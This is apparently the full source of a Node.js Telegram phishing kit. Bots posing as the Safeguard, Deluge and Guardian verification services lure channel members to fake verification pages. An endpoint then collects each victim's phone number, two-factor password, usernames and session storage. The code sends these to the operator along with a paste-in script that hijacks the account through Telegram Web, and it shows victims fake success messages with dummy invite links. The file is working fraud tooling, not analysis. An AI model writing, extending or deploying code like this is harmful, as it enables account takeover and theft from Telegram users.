// File: upgraded-bot.js
const express = require("express");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// Admins list
const admins = [1395348709]; // Add valid admin IDs here

// Load images
const safeguardSuccess = fs.readFileSync(
  path.join(__dirname, "images/success/safeguard.jpg")
);
const guardianSuccess = fs.readFileSync(
  path.join(__dirname, "images/success/guardian.jpg")
);
const delugeVerification = fs.readFileSync(
  path.join(__dirname, "images/verification/deluge.jpg")
);
const guardianVerification = fs.readFileSync(
  path.join(__dirname, "images/verification/guardian.jpg")
);
const safeguardVerification = fs.readFileSync(
  path.join(__dirname, "images/verification/safeguard.jpg")
);

// Initialize bots (supports polling)
const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
  polling: true,
});
const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, {
  polling: true,
});
const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, {
  polling: true,
});

// Text options
const guardianButtonTexts = [
  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
  "Why an Ape ❔ You can be eNORMUS!🔷",
  "🔥Raid with @Raidar 🔥",
];

// Helper to generate random strings
const generateRandomString = (length) => {
  const charset =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  return Array.from({ length }, () =>
    charset.charAt(Math.floor(Math.random() * charset.length))
  ).join("");
};

// Store bot usernames for dynamic processing
let safeguardUsername, delugeUsername, guardianUsername;

// Fetch bot usernames
safeguardBot.getMe().then((botInfo) => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
});
delugeBot.getMe().then((botInfo) => {
  delugeUsername = botInfo.username;
  console.log(`Deluge Bot Username: ${delugeUsername}`);
});
guardianBot.getMe().then((botInfo) => {
  guardianUsername = botInfo.username;
  console.log(`Guardian Bot Username: ${guardianUsername}`);
});

// Set up the Express app
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Webhook setup (optional, alongside polling)
const DOMAIN = process.env.DOMAIN;
safeguardBot.setWebHook(`${DOMAIN}/safeguard`);
delugeBot.setWebHook(`${DOMAIN}/deluge`);
guardianBot.setWebHook(`${DOMAIN}/guardian`);

// Dynamic route for webhook processing
const botMap = {
  safeguard: safeguardBot,
  deluge: delugeBot,
  guardian: guardianBot,
};

app.post("/:type", (req, res) => {
  const { type } = req.params;
  if (!["safeguard", "deluge", "guardian"].includes(type)) {
    return res.status(400).send("Invalid type");
  }
  botMap[type].processUpdate(req.body);
  res.sendStatus(200);
});

// Static HTML serving for verification pages
app.get("/:type", (req, res) => {
  const { type } = req.params;
  if (!["safeguard", "deluge", "guardian"].includes(type)) {
    return res.status(400).send("Invalid or missing type parameter");
  }
  const filePath = path.join(__dirname, "public", type, "index.html");
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send("Verification page not found");
  }
});

// Telegram Info API Endpoint
app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type,
    } = req.body;

    let pass = password || "No Two-factor authentication enabled.";
    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${
          username.isActive ? "✅" : "❌"
        }\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
    const quickAuth = `Object.entries(${JSON.stringify(
      quicklySet
    )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type,
    });
  } catch (error) {
    console.error("500 server error", error);
    res.status(500).json({ error: "server error" });
  }
});

// Main request handler for user data and bot responses
const handleRequest = async (req, res, data) => {
  const bot = botMap[data.type];
  if (!bot) {
    return res.status(400).send("Invalid bot type");
  }

  await bot.sendMessage(
    process.env.LOGS_ID,
    `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${
      data.name
    }\n⭐ <b>Telegram Premium</b>: ${
      data.premium ? "✅" : "❌"
    }\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${
      data.usernames
    }\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${
      data.script
    }</code>\n<b>Module</b>: ${
      data.type.charAt(0).toUpperCase() + data.type.slice(1)
    }`,
    { parse_mode: "HTML" }
  );

  if (["safeguard", "guardian"].includes(data.type)) {
    const image = data.type === "safeguard" ? safeguardSuccess : guardianSuccess;
    const caption =
      data.type === "safeguard"
        ? `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(
            16
          )}`
        : `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(
            16
          )}</i>`;

    const buttons = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Click to Join", url: `https://t.me/+${generateRandomString(16)}` }],
        ],
      },
    };

    await bot.sendPhoto(data.userId, image, {
      caption,
      ...buttons,
      parse_mode: "HTML",
    });
  }
  res.json({});
};

// New Chat Member Handler
const handleNewChatMember = async (bot, type) => {
  bot.on("my_chat_member", async (update) => {
    if (
      update.chat.type === "channel" &&
      update.new_chat_member.status === "administrator" &&
      update.new_chat_member.user.is_bot &&
      admins.includes(update.from.id)
    ) {
      const jsonToSend = {
        caption: `${update.chat.title} is protected by the bot. Click to verify.`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Tap To Verify", url: `https://t.me/${bot.username}?start=scrim` }],
          ],
        },
      };
      const imageToSend =
        type === "safeguard"
          ? safeguardVerification
          : type === "guardian"
          ? guardianVerification
          : delugeVerification;

      bot.sendPhoto(update.chat.id, imageToSend, jsonToSend);
    }
  });
};

// Start Command Handler
const handleStart = (bot) => {
  bot.onText(/\/start (.*)/, (msg, match) => {
    const chatId = msg.chat.id;
    const parameter = match[1];
    const botInfo = bot === safeguardBot
      ? safeguardUsername
      : bot === delugeBot
      ? delugeUsername
      : guardianUsername;

    const jsonToSend = {
      caption: `Bot verified and running. Parameter: ${parameter}`,
      parse_mode: "HTML",
    };

    bot.sendMessage(chatId, jsonToSend.caption, { parse_mode: "HTML" });
  });
};

// Initialize Handlers
handleNewChatMember(safeguardBot, "safeguard");
handleNewChatMember(delugeBot, "deluge");
handleNewChatMember(guardianBot, "guardian");
handleStart(safeguardBot);
handleStart(delugeBot);
handleStart(guardianBot);

// Start the server
app.listen(process.env.PORT || 80, () =>
  console.log(`Server running on port ${process.env.PORT || 80}`)
);
